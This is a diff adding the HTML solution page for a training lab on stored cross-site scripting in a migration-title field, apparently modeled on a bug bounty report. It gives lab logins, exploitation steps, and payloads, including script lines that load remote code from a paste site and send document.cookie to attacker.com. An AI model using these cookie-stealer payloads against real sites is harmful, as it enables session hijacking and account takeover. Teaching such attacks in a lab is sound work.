@@ -1,0 +1,145 @@
+{% extends "base.html" %}
+
+{% block title %}Solution: Lab 01 - Stored XSS in Migration Title{% endblock %}
+
+{% block extra_css %}
+<style>
+    .solution-header {
+        background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
+        padding: 30px;
+        border-radius: 8px;
+        margin-bottom: 30px;
+        color: white;
+    }
+    .solution-header h1 {
+        color: white;
+        margin-bottom: 10px;
+    }
+    .solution-header .lab-number {
+        background: rgba(255, 255, 255, 0.2);
+        padding: 5px 12px;
+        border-radius: 4px;
+        display: inline-block;
+        margin-bottom: 15px;
+    }
+    .objective-box {
+        background: #1c2128;
+        border-left: 4px solid #58a6ff;
+        padding: 20px;
+        margin: 20px 0;
+    }
+    .steps-box {
+        background: #0d1117;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 20px;
+        margin: 20px 0;
+    }
+    .steps-box ol {
+        margin-left: 20px;
+    }
+    .steps-box li {
+        margin-bottom: 10px;
+        line-height: 1.8;
+    }
+    .action-buttons {
+        display: flex;
+        gap: 15px;
+        margin-top: 30px;
+    }
+    .btn-secondary {
+        background: #30363d;
+        color: #c9d1d9;
+    }
+    .btn-secondary:hover {
+        background: #484f58;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="solution-header">
+    <span class="lab-number">LAB 01 - SOLUTION</span>
+    <h1>Stored XSS in Migration Title</h1>
+    <p style="opacity: 0.9; font-size: 16px;">Based on Bug Bounty Report #2553454</p>
+</div>
+
+<div class="card">
+    <h2>📋 Lab Overview</h2>
+    <p>In this lab, you will exploit a <strong>Stored Cross-Site Scripting (XSS)</strong> vulnerability in the migration title field. This vulnerability allows a low-privileged user with the "Migration Coordinator" role to inject malicious scripts that execute when other users view the migration.</p>
+    
+    <div class="objective-box">
+        <h3 style="color: #58a6ff; margin-bottom: 15px;">🎯 Learning Objectives</h3>
+        <ul style="margin-left: 20px;">
+            <li>Understand how stored XSS attacks work</li>
+            <li>Identify vulnerable input fields that lack sanitization</li>
+            <li>Create and test XSS payloads</li>
+            <li>Understand the impact of stored XSS (account takeover)</li>
+            <li>Learn cookie stealing techniques</li>
+        </ul>
+    </div>
+
+    <div class="vulnerability-info">
+        <h3>🔴 Vulnerability Details</h3>
+        <p><strong>Type:</strong> Stored XSS (Persistent)</p>
+        <p><strong>Location:</strong> Migration title field at <code>/migrations</code></p>
+        <p><strong>Severity:</strong> Medium (5.4)</p>
+        <p><strong>Impact:</strong> Account takeover, session hijacking, credential theft</p>
+        <p><strong>Root Cause:</strong> User input in the migration title field is rendered without proper HTML encoding</p>
+    </div>
+</div>
+
+<div class="card">
+    <h2>📝 Step-by-Step Solution</h2>
+    
+    <div class="steps-box">
+        <h3 style="color: #f0f6fc; margin-bottom: 15px;">Step-by-Step Guide:</h3>
+        <ol>
+            <li><strong>Log in as Migration Coordinator:</strong>
+                <ul style="margin-top: 5px; margin-left: 20px;">
+                    <li>Username: <code>migration_coord</code></li>
+                    <li>Password: <code>coord123</code></li>
+                </ul>
+            </li>
+            <li><strong>Navigate to the Migrations page</strong> and create a new migration</li>
+            <li><strong>Inject an XSS payload</strong> in the migration title field</li>
+            <li><strong>Log out</strong> and log in as a different user (victim)</li>
+            <li><strong>View the migration</strong> - the XSS payload should execute</li>
+            <li><strong>Try creating a cookie stealer payload</strong> to demonstrate account takeover</li>
+        </ol>
+    </div>
+
+    <div class="objective-box">
+        <h3 style="color: #58a6ff; margin-bottom: 15px;">💡 Solution & Payloads</h3>
+        <p><strong>Simple Test Payload:</strong></p>
+        <div class="code-block">
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+        </div>
+        <p style="margin-top: 15px;"><strong>Cookie Stealer Payload (from bug report):</strong></p>
+        <div class="code-block">
+&lt;script src=https://nopaste.net/aVBd3wK08b&gt;&lt;/script&gt;
+        </div>
+        <p style="margin-top: 15px;"><strong>Alternative Cookie Stealer:</strong></p>
+        <div class="code-block">
+&lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;
+        </div>
+    </div>
+</div>
+
+<div class="card">
+    <h2>✅ Success Criteria</h2>
+    <p>You have successfully completed this lab when:</p>
+    <ul style="margin-left: 20px; margin-top: 10px;">
+        <li>✓ You can execute JavaScript via the migration title field</li>
+        <li>✓ The XSS payload persists in the database</li>
+        <li>✓ The payload executes when other users view the migration</li>
+        <li>✓ You understand how this could lead to account takeover</li>
+    </ul>
+</div>
+
+<div class="action-buttons">
+    <a href="/migrations" class="btn">Try the Lab →</a>
+    <a href="/" class="btn btn-secondary">← Back to Labs</a>
+</div>
+{% endblock %}
+
